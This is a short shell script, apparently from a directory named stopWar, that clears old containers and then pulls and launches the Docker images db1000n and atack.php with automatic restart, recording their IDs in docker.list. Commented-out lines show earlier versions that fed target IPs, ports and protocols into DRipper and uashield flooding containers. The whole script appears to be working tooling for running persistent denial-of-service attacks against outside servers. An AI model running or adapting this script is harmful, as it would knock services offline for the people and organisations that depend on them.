#!/bin/sh

cd /root/stopWar

[ -f docker.list ] && cat docker.list | xargs docker rm -f && cat /dev/null > docker.list

#cat target | while read ip port proto
#do
#    if [ X$ip = X -o X$port = X -o X$proto = X ]
#    then
#	echo $ip $port $proto
#    else
#	/usr/bin/docker run -d alexmon1989/dripper:latest -s $ip -p $port -t 500 -m $proto > docker.list
#	/usr/bin/docker run -d cherniavsky94/stop-war python3 DRipper.py -s $ip -p $port -t 443 -q 10000 > docker.list
#    fi
#done

/usr/bin/docker pull ghcr.io/arriven/db1000n
/usr/bin/docker pull angello2docker/atack.php

/usr/bin/docker run -d --restart always angello2docker/atack.php >> docker.list
/usr/bin/docker run -d --restart always ghcr.io/arriven/db1000n >> docker.list

#	/usr/bin/docker run -d ghcr.io/opengs/uashield:0.0.x 1024 true  >> docker.list
